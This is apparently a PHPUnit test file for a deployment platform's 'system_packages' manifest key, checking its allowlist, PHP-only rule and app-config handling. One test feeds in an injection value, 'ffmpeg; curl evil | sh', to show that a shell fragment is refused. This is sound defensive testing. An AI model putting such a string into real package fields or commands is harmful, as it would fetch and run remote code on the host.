<?php

namespace Tests\Unit\Deploy\Platform;

use App\Lib\Deploy\Platform\AppConfig\AppConfig;
use App\Lib\Deploy\Platform\ManifestException;
use App\Lib\Deploy\Platform\PlatformManifest;
use App\Lib\Deploy\Platform\ProjectContext;
use App\Lib\Deploy\Platform\SourceRecipes;
use PHPUnit\Framework\TestCase;

/**
 * `system_packages:` — the one way a recipe adds a binary such as ffmpeg to
 * its PHP image. Allowlisted and PHP-only, refused at load
 * rather than ignored: a video site deployed without ffmpeg looks healthy.
 */
class SystemPackagesManifestTest extends TestCase
{
    private function make(array $overrides = []): PlatformManifest
    {
        return PlatformManifest::fromArray(array_merge([
            'id' => 'demo',
            'label' => 'Demo',
            'priority' => 100,
            'runtime' => 'php',
            'detect' => ['file' => 'index.php'],
            'commands' => [],
        ], $overrides));
    }

    public function test_an_allowlisted_set_is_read_sorted_and_deduplicated(): void
    {
        $manifest = $this->make(['system_packages' => ['mediainfo', 'ffmpeg', 'ffmpeg']]);

        $this->assertSame(['ffmpeg', 'mediainfo'], $manifest->systemPackages);
    }

    public function test_absent_or_empty_means_none(): void
    {
        $this->assertSame([], $this->make()->systemPackages);
        $this->assertSame([], $this->make(['system_packages' => null])->systemPackages);
        $this->assertSame([], $this->make(['system_packages' => []])->systemPackages);
    }

    public function test_a_package_outside_the_allowlist_is_refused(): void
    {
        $this->expectException(ManifestException::class);
        $this->expectExceptionMessageMatches("/'imagemagick' is not one the engine can add; allowed: ffmpeg, mediainfo/");
        $this->make(['system_packages' => ['ffmpeg', 'imagemagick']]);
    }

    public function test_a_shell_fragment_is_refused(): void
    {
        $this->expectException(ManifestException::class);
        $this->make(['system_packages' => ['ffmpeg; curl evil | sh']]);
    }

    public function test_a_string_instead_of_a_list_is_refused(): void
    {
        $this->expectException(ManifestException::class);
        $this->expectExceptionMessageMatches('/must be a list/');
        $this->make(['system_packages' => 'ffmpeg']);
    }

    /** Only the PHP base has a variant to put them in; elsewhere they would do nothing. */
    public function test_another_runtime_is_refused(): void
    {
        $this->expectException(ManifestException::class);
        $this->expectExceptionMessageMatches("/only supported for runtime 'php'/");
        $this->make(['runtime' => 'node', 'system_packages' => ['ffmpeg']]);
    }

    public function test_the_decision_carries_the_set_to_the_php_strategy(): void
    {
        $decision = $this->make(['system_packages' => ['ffmpeg']])
            ->describe(ProjectContext::make(sys_get_temp_dir(), []));

        $this->assertSame(['ffmpeg'], $decision['system_packages']);
    }

    /**
     * The path both a shipped source recipe and a repository's own
     * `.panelalpha/panelalpha.yaml` take: extend a platform, add the key.
     */
    public function test_an_app_config_extending_a_php_platform_can_declare_it(): void
    {
        $manifest = SourceRecipes::fromAppConfig(
            AppConfig::fromYaml("extends: php-plain\ndocroot: upload\nsystem_packages: [ffmpeg, mediainfo]\n"),
            'panelalpha.yaml'
        );

        $this->assertNotNull($manifest);
        $this->assertSame('php', $manifest->runtime);
        $this->assertSame(['ffmpeg', 'mediainfo'], $manifest->systemPackages);
    }

    public function test_an_app_config_cannot_reach_past_the_allowlist(): void
    {
        $this->expectException(ManifestException::class);
        SourceRecipes::fromAppConfig(
            AppConfig::fromYaml("extends: php-plain\nsystem_packages: [build-essential]\n"),
            'panelalpha.yaml'
        );
    }
}
